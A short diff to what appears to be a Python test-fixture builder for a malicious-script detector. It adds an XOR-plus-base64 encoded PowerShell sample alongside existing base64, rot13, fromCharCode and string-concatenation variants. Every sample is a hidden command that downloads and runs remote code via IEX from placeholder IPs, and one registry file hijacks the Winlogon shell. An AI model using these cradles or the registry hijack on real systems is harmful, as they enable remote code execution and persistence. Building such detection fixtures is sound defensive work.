@@ -247,6 +247,8 @@ def build_folder(root):
         b"powershell IEX http://13.13.13.13/a " * 3)) + b"'; IEX $d\n")
     w("rotpeek.ps1", b"$d = '" + _b.b64encode(codecs.encode(
         "powershell IEX http://14.14.14.14/a " * 3, "rot13").encode()) + b"'; IEX $d\n")
+    _xor = bytes(c ^ 0x37 for c in b"powershell -w hidden -enc IEX http://15.15.15.15/a " * 2)
+    w("xorpeek.ps1", b"$d = '" + _b.b64encode(_xor) + b"'; IEX $d\n")
     w("decpeek.js", b"var s = String.fromCharCode(" + ", ".join(str(c) for c in b"powershell iex http://2.3.4.5/x ").encode() + b"); eval(s);\n")
     w("concat.ps1", b"$w = New-Object Net.WebClient; \"ie\"+\"x\"($w.DownloadString('http://10.1.1.1/a'))\n")
     w("winlogon.reg", b'RegEdit4\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]\r\n"Shell"="expl.exe"\r\n')
